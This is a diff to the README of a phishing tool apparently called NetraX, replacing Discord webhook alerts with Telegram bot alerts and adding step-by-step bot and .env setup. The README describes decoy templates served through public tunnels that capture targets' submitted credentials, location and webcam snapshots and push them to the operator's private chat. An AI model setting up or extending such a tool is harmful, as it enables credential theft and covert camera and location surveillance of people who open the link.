@@ -79,8 +79,8 @@ NetraX includes 6 handcrafted, mobile-responsive decoy templates ready to deploy
 ## 🚀 Key Features
 
 * **📦 Automatic Dependency & Extension Setup:** Automatically detects your OS package manager (`apt`, `dnf`, `yum`, `pacman`, `brew`, `pkg`, `winget`, `choco`) and installs missing PHP binaries and extensions (`curl`, `json`, `mbstring`, `openssl`).
-* **📢 Live Discord Webhook Alerts:** Sends rich, organized embed notifications to your private Discord channel the moment a target visits or submits data.
-* **🔒 Secure Configuration:** Webhook URLs and environment keys are loaded safely from `.env` and kept out of version control.
+* **📢 Live Telegram Bot Alerts:** Real-time push notifications, structured telemetry cards, and webcam photo snapshots sent directly to your private Telegram chat (with easy one-click chat deletion & privacy revocation).
+* **🔒 Secure Configuration:** Bot tokens, chat IDs, and environment keys are loaded safely from `.env` and kept out of version control.
 * **🌐 Zero-Config Tunneling:** Provisions instant, public HTTPS links using **Cloudflare Quick Tunnels** or **Ngrok**.
 * **🖥️ Cross-Platform:** Works on **Linux (Kali/Ubuntu/Parrot)**, **Termux (Android)**, **macOS**, and **Windows (Git Bash)**.
 * **🧹 Instant Cleanup:** One-click script (`cleanup.sh`) wipes all collected target data from your machine after testing.
@@ -136,15 +136,33 @@ bash netraX-3.0.sh
 
 ---
 
-## ⚙️ Discord Webhook Setup (Optional)
+## ⚙️ Telegram Bot Setup (Recommended for Real-Time Alerts)
 
-To receive real-time mobile notifications when a target interacts with your link:
+Receive instant mobile notifications and webcam snapshots directly in your Telegram chat:
 
-1. Copy `.env.example` to `.env` (or create a `.env` file in the root directory):
-   ```bash
-   DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE"
-   ```
-2. NetraX will automatically send formatted telemetry embeds whenever a visitor arrives, enters credentials, or triggers location tracking.
+### Step 1: Create your Telegram Bot
+1. Open Telegram and search for **`@BotFather`**.
+2. Send `/newbot` and follow the prompts to choose a bot name and username.
+3. Copy the **HTTP API Token** provided (e.g. `7123456789:AAHk...`).
+
+### Step 2: Get your Chat ID
+1. Search for **`@userinfobot`** on Telegram and click **Start**.
+2. Copy your **Id** number (e.g. `1234567890`).
+
+### Step 3: Configure `.env`
+Create a `.env` file in the root folder (or copy `.env.example`):
+```bash
+cp .env.example .env
+```
+Edit `.env` and add your bot credentials:
+```env
+TELEGRAM_BOT_TOKEN="7123456789:AAHk_your_token_here"
+TELEGRAM_CHAT_ID="1234567890"
+
+# Optional Discord Webhook fallback:
+DISCORD_WEBHOOK_URL=""
+```
+Whenever a target opens a link, submits credentials, or allows camera/location, NetraX will instantly push clean HTML cards and captured photos directly to your Telegram chat!
 
 ---
 
